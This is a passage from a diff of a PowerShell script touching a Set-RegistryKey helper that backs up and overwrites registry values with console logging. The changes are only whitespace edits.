 }
 Function Set-RegistryKey() {
     Param
@@ -736,7 +730,7 @@ Function Set-RegistryKey() {
         $RegValue,
         $RegData,
         [ValidateSet('String', 'DWord', 'Binary', 'ExpandString', 'MultiString', 'None', 'QWord', 'Unknown')]
-        $RegType = 'String'
+        $RegType = 'String'    
     )
 
     If (-not (Test-Path $RegKey)) {
@@ -748,7 +742,7 @@ Function Set-RegistryKey() {
         Catch {
             Write-Error -Message $_
         }
-        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull"
+        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull" 
     }
     else {
         Write-LogToConsole "The key $RegKey already exists. Try to set value"
@@ -758,21 +752,22 @@ Function Set-RegistryKey() {
             if ($OriginalValue -ne $null) {
                 New-Item -Path $RegKey -Name _Backup –Force | Out-Null
                 Write-LogToConsole "Creating registry backup at $($RegKey)\_Backup"
-
-                Set-ItemProperty -Path "$($RegKey)\_Backup" -Name $RegValue -Value $OriginalValue.$RegValue -Type $RegType -Force
+            
+                Set-ItemProperty -Path "$($RegKey)\_Backup" -Name $RegValue -Value $OriginalValue.$RegValue -Type $RegType -Force            
             }
             # Overwrite
-            Set-ItemProperty -Path $RegKey -Name $RegValue -Value $RegData -Type $RegType -Force
+            Set-ItemProperty -Path $RegKey -Name $RegValue -Value $RegData -Type $RegType -Force            
         }
         Catch {
             Write-ErrToConsole -Message $_
         }
-        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull"
+        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull"    
     }
-
+          
 }
 
 
 
 Init
 Main
+
